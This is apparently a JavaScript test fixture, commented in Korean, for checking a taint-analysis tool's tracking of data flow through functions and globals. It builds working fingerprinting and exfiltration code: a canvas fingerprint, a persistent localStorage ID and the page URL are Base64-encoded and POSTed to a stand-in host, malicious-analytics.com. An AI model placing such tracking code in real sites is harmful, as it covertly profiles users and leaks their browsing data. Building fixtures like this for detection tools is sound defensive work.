/*
 * Hybrid Tracker Simulation
 * - Techniques: Canvas Fingerprinting, Global State Caching, Indirect Exfiltration
 * - Goal: Test Inter-procedural & Global Variable Taint Analysis
 */

(function() {
    // [Technique 1] Global State Obfuscation
    // 추적자들은 데이터를 바로 보내지 않고 전역 객체에 숨겨두는 경우가 많습니다.
    var _cache = window._ghost_cache || {}; 

    // Helper: Base64 Encoding (Obfuscation simulation)
    function encodeData(str) {
        // btoa는 브라우저 내장 함수지만, 오염이 끊기지 않고 전파되는지 확인용
        return btoa(str); 
    }

    // [Source 1] Canvas Fingerprinting (Browser Uniqueness)
    function generateFingerprint() {
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        var txt = 'browser_fingerprint_test';
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = "#069";
        ctx.fillText(txt, 2, 15);
        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
        ctx.fillText(txt, 4, 17);
        
        // SOURCE: canvas.toDataURL (SourceDefinitions에 정의되어 있어야 함)
        return canvas.toDataURL(); 
    }

    // [Source 2] Persistent ID (Storage)
    function getTrackingId() {
        // SOURCE: localStorage.getItem (이미 정의됨)
        var uid = localStorage.getItem('ghost_uid');
        if (!uid) {
            uid = 'uid-' + Math.random();
            localStorage.setItem('ghost_uid', uid);
        }
        return uid;
    }

    // [Source 3] Current Context (Location)
    function getPageInfo() {
        // SOURCE: location.href (이미 정의됨)
        return window.location.href;
    }

    // [Aggregation] Data Bundling (Inter-procedural Flow)
    function collectMetrics() {
        var fp = generateFingerprint(); // Tainted (Canvas)
        var uid = getTrackingId();      // Tainted (Storage)
        var url = getPageInfo();        // Tainted (Location)

        var payload = {
            device_id: fp,
            user_id: uid,
            visited_url: url,
            timestamp: Date.now()
        };

        // [Global Store] Store tainted object into global variable
        // 님의 Global Pre-scan 로직이 여기서 '_cache'를 오염원으로 마킹해야 함
        window._ghost_cache = payload;
    }

    // [Sink] Exfiltration (Send Data)
    function exfiltrate() {
        // [Global Load] Read from polluted global variable
        var data = window._ghost_cache; 

        if (data) {
            var jsonStr = JSON.stringify(data);
            var safePayload = encodeData(jsonStr); // 오염 전파 확인 (Function Call)

            // SINK: fetch API (Network Leak)
            // 님의 도구가 fetch를 Sink로 잡고 있다면 여기서 경로가 완성됨
            fetch('https://malicious-analytics.com/collect', {
                method: 'POST',
                body: safePayload,
                headers: {
                    'Content-Type': 'text/plain'
                }
            });
        }
    }

    // === Execution Flow ===
    collectMetrics(); // Step 1: Collect & Store to Global
    
    // Simulate async delay or event loop
    if (true) {
        exfiltrate(); // Step 2: Load from Global & Send (Sink)
    }

})();